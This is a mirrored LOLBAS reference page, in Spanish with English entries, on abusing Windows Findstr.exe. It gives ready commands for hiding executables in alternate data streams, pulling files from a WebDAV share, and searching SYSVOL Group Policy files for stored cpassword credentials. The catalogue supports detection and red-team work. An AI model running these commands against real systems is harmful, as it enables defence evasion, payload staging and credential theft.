# LOLBAS: Findstr.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `ADS`, `Credentials`, `Download`

Write to ADS, discover, or download files with Findstr.exe

## Comandos

### Add a file to an alternate data stream to hide from defensive counter measures

ADS · priv: User · T1564.004

```cmd
findstr /V /L W3AllLov3LolBas {PATH_ABSOLUTE:.exe} > {PATH_ABSOLUTE}:file.exe
```

Searches for the string W3AllLov3LolBas, since it does not exist (/V) the specified .exe file is written to an Alternate Data Stream (ADS) of the specified target file.

### Add a file to an alternate data stream from a webdav server to hide from defensive counter measures

ADS · priv: User · T1564.004

```cmd
findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE}:file.exe
```

Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.

### Find credentials stored in cpassword attrbute

Credentials · priv: User · T1552.001

```cmd
findstr /S /I cpassword \\sysvol\policies\*.xml
```

Search for stored password in Group Policy files stored on SYSVOL.

### Download/Copy file from webdav server

Download · priv: User · T1105

```cmd
findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE:.exe}
```

Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is downloaded to the target file.

